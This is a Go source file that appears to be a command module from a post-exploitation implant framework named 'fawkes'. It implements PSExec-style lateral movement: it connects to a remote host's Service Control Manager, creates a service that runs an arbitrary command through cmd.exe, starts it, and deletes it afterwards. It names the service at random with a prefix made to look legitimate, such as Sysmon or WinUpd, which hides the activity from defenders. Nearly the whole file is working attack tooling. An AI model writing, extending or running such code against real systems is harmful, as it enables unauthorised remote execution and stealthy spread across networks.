//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc/mgr"
)

type PsExecCommand struct{}

func (c *PsExecCommand) Name() string {
	return "psexec"
}

func (c *PsExecCommand) Description() string {
	return "Execute commands on remote hosts via SCM service creation (PSExec-style lateral movement)"
}

type psexecArgs struct {
	Host    string `json:"host"`
	Command string `json:"command"`
	Name    string `json:"name"`
	Display string `json:"display"`
	Cleanup string `json:"cleanup"`
}

func (c *PsExecCommand) Execute(task structs.Task) structs.CommandResult {
	var args psexecArgs

	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required (host, command)",
			Status:    "error",
			Completed: true,
		}
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Host == "" {
		return structs.CommandResult{
			Output:    "Error: host is required",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Command == "" {
		return structs.CommandResult{
			Output:    "Error: command is required",
			Status:    "error",
			Completed: true,
		}
	}

	// Generate random service name if not provided
	serviceName := args.Name
	if serviceName == "" {
		serviceName = randomServiceName()
	}

	displayName := args.Display
	if displayName == "" {
		displayName = serviceName
	}

	// Determine if cleanup should happen (default: true)
	cleanup := true
	if strings.ToLower(args.Cleanup) == "false" || args.Cleanup == "0" {
		cleanup = false
	}

	// Build the service binary path — wrap command in cmd.exe /c
	// Use full path because SCM does not expand environment variables
	binPath := args.Command
	if !strings.HasPrefix(strings.ToLower(binPath), "cmd") &&
		!strings.HasPrefix(strings.ToLower(binPath), `c:\windows`) {
		binPath = `C:\Windows\System32\cmd.exe /c ` + binPath
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("PSExec on %s:\n", args.Host))
	sb.WriteString(fmt.Sprintf("  Service:  %s\n", serviceName))
	sb.WriteString(fmt.Sprintf("  Command:  %s\n", binPath))
	sb.WriteString(fmt.Sprintf("  Cleanup:  %v\n\n", cleanup))

	// Step 1: Connect to remote SCM
	sb.WriteString("[1] Connecting to remote SCM...\n")
	m, err := mgr.ConnectRemote(args.Host)
	if err != nil {
		sb.WriteString(fmt.Sprintf("  Error: %v\n", err))
		sb.WriteString("\nHint: Ensure you have admin credentials on the target. Use make-token first.")
		return structs.CommandResult{
			Output:    sb.String(),
			Status:    "error",
			Completed: true,
		}
	}
	defer m.Disconnect()
	sb.WriteString("  Connected.\n")

	// Step 2: Create the service using Windows API directly.
	// mgr.CreateService wraps binpath in quotes which breaks "cmd.exe /c ..." commands.
	// We call windows.CreateService directly to pass the binary path unquoted.
	sb.WriteString(fmt.Sprintf("[2] Creating service '%s'...\n", serviceName))
	svcHandle, err := windows.CreateService(
		m.Handle,
		windows.StringToUTF16Ptr(serviceName),
		windows.StringToUTF16Ptr(displayName),
		windows.SERVICE_ALL_ACCESS,
		windows.SERVICE_WIN32_OWN_PROCESS,
		windows.SERVICE_DEMAND_START,
		windows.SERVICE_ERROR_IGNORE,
		windows.StringToUTF16Ptr(binPath),
		nil, nil, nil, nil, nil,
	)
	if err != nil {
		sb.WriteString(fmt.Sprintf("  Error: %v\n", err))
		return structs.CommandResult{
			Output:    sb.String(),
			Status:    "error",
			Completed: true,
		}
	}
	sb.WriteString("  Created.\n")

	// Step 3: Start the service
	sb.WriteString("[3] Starting service...\n")
	err = windows.StartService(svcHandle, 0, nil)
	if err != nil {
		sb.WriteString(fmt.Sprintf("  Start result: %v\n", err))
		// Service will fail to start if the command exits quickly — expected for
		// cmd.exe /c. Error 1053 = "service did not respond to start or control request"
		if strings.Contains(err.Error(), "1053") || strings.Contains(err.Error(), "service did not respond") {
			sb.WriteString("  (Expected — command executed and exited quickly)\n")
		}
	} else {
		sb.WriteString("  Started.\n")
		// Wait briefly for command to execute
		time.Sleep(2 * time.Second)
	}

	// Step 4: Cleanup — delete the service
	if cleanup {
		sb.WriteString("[4] Cleaning up...\n")
		err = windows.DeleteService(svcHandle)
		if err != nil {
			sb.WriteString(fmt.Sprintf("  Error deleting service: %v\n", err))
		} else {
			sb.WriteString("  Service deleted.\n")
		}
	} else {
		sb.WriteString("[4] Skipping cleanup (cleanup=false).\n")
	}
	windows.CloseServiceHandle(svcHandle)

	sb.WriteString("\nDone.")

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func randomServiceName() string {
	// Generate a plausible-looking Windows service name
	prefixes := []string{"Winsvc", "Sysmon", "WinMgmt", "NetSvc", "AppSvc", "SvcHost", "WinUpd", "SecSvc"}
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	prefix := prefixes[r.Intn(len(prefixes))]
	suffix := fmt.Sprintf("%04x", r.Intn(0xFFFF))
	return prefix + suffix
}
